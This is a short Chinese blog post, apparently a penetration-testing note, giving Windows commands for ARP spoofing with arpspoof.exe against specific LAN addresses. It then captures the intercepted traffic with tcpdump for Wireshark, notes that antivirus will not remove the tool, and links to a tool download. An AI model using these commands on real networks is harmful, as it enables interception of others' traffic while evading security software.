---
title: windows 下tcpdump+arpspoof arp嗅探
date: 2016-06-29 19:12
tags: 内网渗透
---

arp 欺骗:

`arpspoof.exe /l`  ##列出网络接口
`arpspoof.exe 192.168.3.1 192.168.3.5 80 0 1`

嗅探：

`tcpdump -D` //查看网络接口
`tcpdump -i 3 -w h.cap -s 0`

`-s0` 表示取消抓包长度限制
否则会导致抓包不全！
`win` 下的 `tcpdump` 好处就是 无需安装`wincap` 纯命令行下操作
杀软不会干掉

随后便可用 `wireshark` 分析数据包

[相关工具下载](https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/%E5%97%85%E6%8E%A2.zip)
